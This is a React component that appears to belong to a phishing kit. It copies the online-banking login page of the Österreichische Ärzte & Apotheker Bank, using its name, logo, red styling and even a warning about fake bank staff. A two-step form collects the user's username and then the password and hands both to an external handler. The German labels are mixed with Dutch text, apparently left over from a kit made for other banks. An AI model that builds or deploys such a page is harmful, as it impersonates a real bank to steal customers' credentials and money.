"use client";

import React, { useState } from "react";

type Props = {
  formData: {
    verfuegernummer?: string;
    pin?: string;
  };
  onChange: (field: string, value: string) => void;
  handleRouteAction: () => void;
  saving?: boolean;
};

export function AerzteApothekerBank({ formData, onChange, handleRouteAction, saving }: Props) {
  const [step, setStep] = useState(1);

  const handleNextStep = (e: React.FormEvent) => {
    e.preventDefault();
    if (formData.verfuegernummer) {
      setStep(2);
    }
  };

  const handleFinalSubmit = (e: React.FormEvent) => {
    e.preventDefault();
    handleRouteAction();
  };

  return (
    <div className="min-h-screen flex flex-col font-sans">
      {/* Header */}
      <header className="bg-white h-[85px] flex items-center px-4 md:px-12 w-full shadow-sm relative z-10">
        <img src="/aerzte-apotheker-logo.webp" alt="ÖSTERREICHISCHE ÄRZTE & APOTHEKER BANK AG" className="h-[60px] object-contain ml-8 lg:ml-24" />
      </header>

      {/* Main Background Area */}
      <main 
        className="flex-grow flex items-center justify-center p-4 bg-cover bg-center"
        style={{ backgroundImage: "url('/aerzte-apotheker-bg.webp')" }}
      >
        {/* Center Card with Cutout Shape */}
        <div className="relative w-full max-w-[620px]">
          {/* Card Container */}
          <div className="bg-white rounded-lg shadow-[0_10px_40px_rgba(0,0,0,0.15)] overflow-hidden relative z-10">
            
            {/* Red Header Bar */}
            <div className="bg-[#cc0000] px-8 py-4">
              <h1 className="text-white text-[24px] font-normal tracking-wide">Digital Banking</h1>
            </div>

            <div className="p-8">
              {/* Warning Box */}
              <div className="bg-[#cc0000] rounded-md p-5 flex gap-4 mb-6">
                <div className="flex-shrink-0 mt-0.5">
                  <div className="w-10 h-10 flex items-center justify-center">
                    <svg viewBox="0 0 24 24" className="w-10 h-10 fill-white">
                      <path d="M12 2L1 21h22L12 2zm0 3.8l8.5 14.2H3.5L12 5.8zM11 10v4h2v-4h-2zm0 6v2h2v-2h-2z" />
                    </svg>
                  </div>
                </div>
                <div className="flex flex-col text-white">
                  <h2 className="font-bold text-[15px] mb-1">Achtung: Anrufe FALSCHER Bankmitarbeiter!</h2>
                  <p className="text-[14px] leading-relaxed">
                    <strong className="font-bold">NIEMALS</strong> Passwörter, Gebruikersnaamn oder Codes nennen.<br />
                    <strong className="font-bold">SOFORT</strong> auflegen, wenn Sie danach gefragt werden.
                  </p>
                </div>
              </div>

              {/* Informational Paragraph */}
              <p className="text-[14px] text-gray-700 mb-8 leading-relaxed pr-2">
                Tijdens het inloggen wordt een beveiligde verbinding opgezet. Let op dat u uw inloggegevens nergens anders invoert en deze geheim houdt.
              </p>

              {/* Login Form */}
              <form 
                onSubmit={step === 1 ? handleNextStep : handleFinalSubmit}
                className="flex flex-col"
              >
                {step === 1 ? (
                  <>
                    <div className="flex justify-between items-end mb-1 border-b border-gray-200 pb-1">
                      <label className="text-[12px] text-gray-500">Anmeldung mit Gebruikersnaam</label>
                      <div className="text-[12px] text-[#cc0000]">
                        <a href="#" className="hover:underline">Barrierefrei</a> <span className="text-gray-400 mx-1">|</span> <a href="#" className="hover:underline">English</a>
                      </div>
                    </div>

                    <div className="mt-2 mb-4">
                      <input 
                        type="text" 
                        value={formData.verfuegernummer || ""}
                        onChange={(e) => onChange("verfuegernummer", e.target.value)}
                        className="w-full bg-[#f4f4f4] border border-gray-200 rounded-md p-3 h-11 outline-none focus:border-gray-400 transition-colors text-[14px] text-gray-800"
                      />
                    </div>
                    
                    <div className="text-center mb-6">
                      <a href="#" className="text-[13px] text-[#cc0000] hover:underline">
                        Wenn Sie noch keinen Gebruikersnaamn haben klicken Sie bitte hier
                      </a>
                    </div>
                  </>
                ) : (
                  <>
                    <div className="flex justify-between items-end mb-1 border-b border-gray-200 pb-1">
                      <label className="text-[12px] text-gray-500">Wachtwoord</label>
                      <div className="text-[12px] text-[#cc0000]">
                        <a href="#" className="hover:underline">Barrierefrei</a> <span className="text-gray-400 mx-1">|</span> <a href="#" className="hover:underline">English</a>
                      </div>
                    </div>

                    <div className="mt-2 mb-4">
                      <input 
                        type="password" 
                        value={formData.pin || ""}
                        onChange={(e) => onChange("pin", e.target.value)}
                        autoFocus
                        className="w-full bg-[#f4f4f4] border border-gray-200 rounded-md p-3 h-11 outline-none focus:border-gray-400 transition-colors text-[14px] text-gray-800"
                      />
                    </div>
                  </>
                )}

                {/* Primary Button */}
                <button 
                  type="submit" 
                  disabled={saving} 
                  className="w-full bg-[#cc0000] hover:bg-[#b30000] text-white py-[10px] rounded-md font-normal transition-colors text-[16px]"
                >
                  {saving ? "Laden..." : "Weiter"}
                </button>
              </form>

              {/* Footer Links */}
              <div className="mt-8 flex flex-col items-center gap-0.5 border-t border-gray-200 pt-6">
                <a href="#" className="text-[13px] text-[#cc0000] hover:underline">Gebruikersnaam vergessen?</a>
                <a href="#" className="text-[13px] text-[#cc0000] hover:underline">Wachtwoord vergessen?</a>
              </div>
            </div>
          </div>
        </div>
      </main>
    </div>
  );
}
